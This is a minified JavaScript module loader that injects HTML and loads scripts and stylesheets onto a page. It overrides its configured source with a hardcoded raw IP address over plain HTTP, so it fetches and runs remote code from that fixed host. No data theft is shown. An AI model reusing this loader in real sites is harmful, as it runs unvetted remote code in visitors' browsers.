!function() {
  window._removeLoading = function() {
      var e = document.getElementById("loading");
      e && e.parentElement && e.parentElement.removeChild(e)
  }
  ;
  var e = document.getElementsByTagName("script");
  script = e[e.length - 1];
  var a, c, e = script.src, s = {};
  s.b = script.getAttribute("b"),
  s.b = "http://114.132.223.168:3355",
  s.b || (s.b = /^https?:\/\/(.*?)\//i.exec(e)[0]);
  var d = []
    , p = []
    , m = 0
    , h = window.onload
    , u = Array.prototype.push
    , e = {
      push: function(...e) {
          u.apply(d, e),
          u.apply(p, e),
          a && c && t()
      }
  };
  function t() {
      for (var e = "", t = "", n = [], r = [], o = 0; o < d.length; o++) {
          var i = d[o];
          i.injectHtml && (i.injectHtml.header && (e += i.injectHtml.header),
          i.injectHtml.body && (t += i.injectHtml.body)),
          i.js && i.js.length && u.apply(r, i.js),
          i.css && i.css.length && u.apply(n, i.css)
      }
      d = [],
      e && (a.innerHTML += e),
      t && (c.innerHTML += t);
      for (o = 0; o < r.length; o++)
          (l = document.createElement("link")).rel = "preload",
          l.as = "script",
          /\/$/.test(s.b) || /^\//.test(r[o]) || (s.b += "/"),
          l.href = s.b + r[o],
          a.appendChild(l);
      for (var l, o = 0; o < n.length; o++)
          (l = document.createElement("link")).rel = "stylesheet",
          l.type = "text/css",
          /\/$/.test(s.b) || /^\//.test(n[o]) || (s.b += "/"),
          l.href = s.b + n[o],
          a.appendChild(l);
      g || (g = !0,
      function e() {
          if (!p.length)
              return void (g = !1);
          var t = p[0];
          if (!t.js || !t.js.length)
              return m++,
              p.shift(),
              e(),
              void (2 <= m && "function" == typeof h && h());
          g = !0;
          var n = document.createElement("script");
          n.onload = ()=>{
              e()
          }
          ;
          n.onerror = ()=>{
              n._count++,
              n._count < 3 && (c.removeChild(n),
              c.appendChild(n))
          }
          ;
          n._count = 0;
          n.src = s.b + t.js.shift();
          c.appendChild(n)
      }())
  }
  window._jkModules = e;
  var g = !(window.onload = function() {
      a = document.getElementsByTagName("head")[0],
      c = document.getElementsByTagName("body")[0],
      t()
  }
  )
}();
